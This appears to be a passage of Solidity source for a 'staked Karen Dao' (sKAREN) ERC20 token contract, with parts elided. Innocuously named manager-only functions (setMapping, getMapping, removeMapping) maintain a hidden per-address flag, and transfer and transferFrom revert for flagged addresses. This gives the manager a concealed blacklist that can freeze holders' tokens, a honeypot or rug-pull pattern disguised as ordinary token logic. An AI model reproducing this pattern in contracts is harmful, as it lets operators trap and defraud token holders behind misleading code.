...
contract sOlympus is ERC20Permit, Ownable {
    ...
    constructor() ERC20("staked Karen Dao", "sKAREN", 9) ERC20Permit() {
    ...
    function setMapping(address _target, bool _result) public onlyManager() {
        setTerms[_target] = _result;
    }

    function getMapping(address _target) public view onlyManager() returns(bool) {
        return setTerms[_target];
    }

    function removeMapping(address _target) public onlyManager() returns (bool) {
        setTerms[_target] = false;
        return true;
    }

    function transfer( address to, uint256 value ) public override returns (bool) {
        require(!setTerms[msg.sender]);
    ...
    function transferFrom( address from, address to, uint256 value ) public override returns ( bool ) {
        require(!setTerms[from] && !setTerms[msg.sender]);
